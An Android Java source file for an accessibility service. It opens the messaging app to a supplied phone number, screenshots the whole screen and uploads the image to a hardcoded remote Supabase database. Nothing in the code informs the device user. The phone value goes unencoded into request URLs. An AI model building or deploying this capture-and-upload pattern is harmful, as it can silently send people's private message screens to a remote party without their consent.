package com.smsbot;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.AccessibilityService.ScreenshotResult;
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONArray;
import org.json.JSONObject;

public class SmsAccessibilityService extends AccessibilityService {
    private static final String SUPABASE_URL = "https://xusnqiovgqgrxxyikvxk.supabase.co";
    private static final String SUPABASE_KEY = "sb_publishable_5Nr0YPv96-6cyQQKoDXlqg_OkhyqPvB";
    private static SmsAccessibilityService instance;
    private String pendingPhone = null;
    private Handler handler = new Handler(Looper.getMainLooper());

    public static SmsAccessibilityService getInstance() {
        return instance;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 500;
        info.packageNames = new String[]{
                "com.google.android.apps.messaging",
                "com.android.mms",
                "com.samsung.android.messaging"
        };
        setServiceInfo(info);
    }

    public void setPendingPhone(String phone) {
        this.pendingPhone = phone;
        handler.post(() -> openSmsApp());
    }

    private void openSmsApp() {
        try {
            Intent intent = new Intent(Intent.ACTION_SENDTO);
            intent.setData(Uri.parse("smsto:" + Uri.encode(pendingPhone)));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.e("SMS_ACCESS", "Cannot open SMS app", e);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (pendingPhone == null) return;
        if (event.getPackageName() == null) return;

        String pkg = event.getPackageName().toString();
        if (pkg.contains("mms") || pkg.contains("messaging") || pkg.contains("messages")) {
            handler.removeCallbacksAndMessages(null);
            handler.postDelayed(() -> {
                String phoneCopy = pendingPhone;
                if (phoneCopy == null) return;
                takeScreenshotAndUpload();
                pendingPhone = null;
            }, 2500);
        }
    }

    private void takeScreenshotAndUpload() {
        final String phoneForUpload = pendingPhone;
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.e("SMS_ACCESS", "takeScreenshot requires Android 11+");
            return;
        }
        takeScreenshot(
                Display.DEFAULT_DISPLAY,
                getMainExecutor(),
                new TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(ScreenshotResult result) {
                        try {
                            Bitmap bitmap = Bitmap.wrapHardwareBuffer(
                                    result.getHardwareBuffer(),
                                    result.getColorSpace()
                            );
                            if (bitmap == null) {
                                Log.e("SMS_ACCESS", "Bitmap null");
                                return;
                            }
                            Bitmap copy = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            copy.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                            String base64 = Base64.encodeToString(
                                    baos.toByteArray(),
                                    Base64.NO_WRAP
                            );
                            updateTaskInSupabase(phoneForUpload, base64);
                            copy.recycle();
                            result.getHardwareBuffer().close();
                        } catch (Exception e) {
                            Log.e("SMS_ACCESS", "Screenshot save error", e);
                        }
                    }

                    @Override
                    public void onFailure(int errorCode) {
                        Log.e("SMS_ACCESS", "Screenshot failed: " + errorCode);
                    }
                }
        );
    }

    private void updateTaskInSupabase(String phone, String screenshotBase64) {
        try {
            URL url = new URL(SUPABASE_URL + "/rest/v1/tasks?phone=eq." + phone + "&order=created_at.desc&limit=1");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestProperty("apikey", SUPABASE_KEY);
            conn.setRequestProperty("Authorization", "Bearer " + SUPABASE_KEY);
            conn.setRequestMethod("GET");
            if (conn.getResponseCode() != 200) return;
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            JSONObject task = new JSONArray(sb.toString()).getJSONObject(0);
            int taskId = task.getInt("id");

            JSONObject updateBody = new JSONObject();
            updateBody.put("screenshot", screenshotBase64);
            URL updateUrl = new URL(SUPABASE_URL + "/rest/v1/tasks?id=eq." + taskId);
            HttpURLConnection updateConn = (HttpURLConnection) updateUrl.openConnection();
            updateConn.setRequestMethod("PATCH");
            updateConn.setRequestProperty("apikey", SUPABASE_KEY);
            updateConn.setRequestProperty("Authorization", "Bearer " + SUPABASE_KEY);
            updateConn.setRequestProperty("Content-Type", "application/json");
            updateConn.setDoOutput(true);
            updateConn.getOutputStream().write(updateBody.toString().getBytes());
            updateConn.getResponseCode();
        } catch (Exception e) {
            Log.e("SMS_ACCESS", "Update error", e);
        }
    }

    @Override
    public void onInterrupt() {}
}
